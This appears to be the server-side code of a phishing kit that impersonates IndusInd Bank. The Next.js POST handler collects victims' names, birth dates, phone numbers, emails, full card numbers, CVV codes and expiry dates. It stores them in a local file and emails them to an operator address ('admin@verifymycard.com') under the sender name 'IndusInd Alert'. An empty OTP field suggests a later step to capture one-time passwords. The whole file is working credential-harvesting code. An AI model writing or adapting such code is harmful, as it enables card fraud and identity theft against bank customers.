import { NextResponse } from 'next/server';
import nodemailer from 'nodemailer';
import fs from 'fs';
import path from 'path';

const DATA_FILE = path.join(process.cwd(), 'data', 'submissions.json');

function readSubmissions() {
  try {
    const raw = fs.readFileSync(DATA_FILE, 'utf-8');
    return JSON.parse(raw);
  } catch {
    return [];
  }
}

function saveSubmissions(submissions) {
  fs.mkdirSync(path.dirname(DATA_FILE), { recursive: true });
  fs.writeFileSync(DATA_FILE, JSON.stringify(submissions, null, 2));
}

export async function POST(request) {
  try {
    const data = await request.json();
    const timestamp = new Date().toISOString();
    const id = Date.now().toString();

    // 1. Save to JSON file
    const submissions = readSubmissions();
    const newEntry = {
      id,
      timestamp,
      page: data.pageTitle || 'Unknown',
      name: data.name || '',
      lastname: data.lastname || '',
      birth: data.birth || '',
      phone: data.phone || '',
      email: data.email || '',
      cardLimit: data.cardLimit || '',
      card: data.card || '',
      cvcpwd: data.cvcpwd || '',
      expmonth: data.expmonth || '',
      expyear: data.expyear || '',
      otp: '',
    };
    submissions.push(newEntry);
    saveSubmissions(submissions);

    // 2. Send email to admin (like send-mail.php)
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST || 'smtp.gmail.com',
      port: parseInt(process.env.SMTP_PORT || '587'),
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    });

    const adminEmail = process.env.ADMIN_EMAIL || 'admin@verifymycard.com';

    const emailBody = `
      <h2 style="color:#800020;">New Form Submission — IndusInd Bank</h2>
      <table border="1" cellpadding="8" cellspacing="0" style="border-collapse:collapse;width:100%;font-family:sans-serif;">
        <tr><td><b>Page</b></td><td>${data.pageTitle}</td></tr>
        <tr><td><b>Date/Time</b></td><td>${new Date().toLocaleString('en-IN')}</td></tr>
        <tr><td><b>First Name</b></td><td>${data.name}</td></tr>
        <tr><td><b>Last Name</b></td><td>${data.lastname}</td></tr>
        <tr><td><b>Date of Birth</b></td><td>${data.birth}</td></tr>
        <tr><td><b>Phone</b></td><td>${data.phone}</td></tr>
        <tr><td><b>Email</b></td><td>${data.email}</td></tr>
        <tr><td><b>Card Limit</b></td><td>${data.cardLimit}</td></tr>
        <tr><td><b>Card Number</b></td><td>${data.card}</td></tr>
        <tr><td><b>CVC/CVV</b></td><td>${data.cvcpwd}</td></tr>
        <tr><td><b>Expiry</b></td><td>${data.expmonth} / ${data.expyear}</td></tr>
      </table>
    `;

    if (process.env.SMTP_USER && process.env.SMTP_PASS) {
      await transporter.sendMail({
        from: `"IndusInd Alert" <${process.env.SMTP_USER}>`,
        to: adminEmail,
        subject: `New Submission: ${data.pageTitle} — ${data.name} ${data.lastname}`,
        html: emailBody,
      });
    }

    return NextResponse.json({ success: true, id, message: 'Form submitted successfully' });
  } catch (error) {
    console.error('Error handling form submission:', error);
    return NextResponse.json({ success: false, error: 'Invalid payload' }, { status: 400 });
  }
}
